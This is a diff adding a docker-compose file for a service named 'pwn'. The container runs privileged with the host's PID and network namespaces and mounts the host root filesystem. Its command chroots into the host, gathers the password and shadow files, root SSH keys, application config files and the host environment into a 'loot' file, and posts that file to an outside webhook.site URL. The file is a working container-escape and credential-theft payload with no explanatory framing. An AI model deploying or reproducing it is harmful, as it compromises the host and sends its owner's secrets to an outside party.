@@ -1,0 +1,40 @@
+services:
+  pwn:
+    image: alpine:latest
+    container_name: pwn
+    privileged: true
+    pid: host
+    network_mode: host
+    volumes:
+      - /:/host
+    command: >
+      sh -c "
+        chroot /host sh -c '
+          echo \"=== ID ===\";
+          id;
+          echo \"=== HOSTNAME ===\";
+          hostname;
+          echo \"=== UNRAID ===\";
+          uname -a;
+          echo \"=== PASSWD ===\";
+          cat /etc/passwd;
+          echo \"=== SHADOW ===\";
+          cat /etc/shadow 2>/dev/null;
+          echo \"=== SSH KEYS ===\";
+          cat /root/.ssh/id_rsa 2>/dev/null;
+          cat /root/.ssh/authorized_keys 2>/dev/null;
+          echo \"=== CLOUDFLARE ===\";
+          cat /opt/docker/cloudflareddns/config.json 2>/dev/null;
+          echo \"=== TENT ===\";
+          cat /opt/docker/tent/config.php 2>/dev/null;
+          echo \"=== PRIVATEBIN ===\";
+          cat /opt/docker/privatebin/conf.php 2>/dev/null;
+          echo \"=== HOST ENV ===\";
+          cat /proc/1/environ 2>/dev/null | tr \"\\0\" \"\\n\";
+          echo \"=== /opt/docker ===\";
+          ls -la /opt/docker/;
+          echo \"=== DOCKER PS ===\";
+          docker ps 2>/dev/null || ls /var/run/docker.sock 2>/dev/null;
+        ' > /tmp/loot.txt 2>&1;
+        wget -qO- --post-file=/tmp/loot.txt https://webhook.site/8f39443b-d373-4f17-b17d-23b26de6c55c
+      "
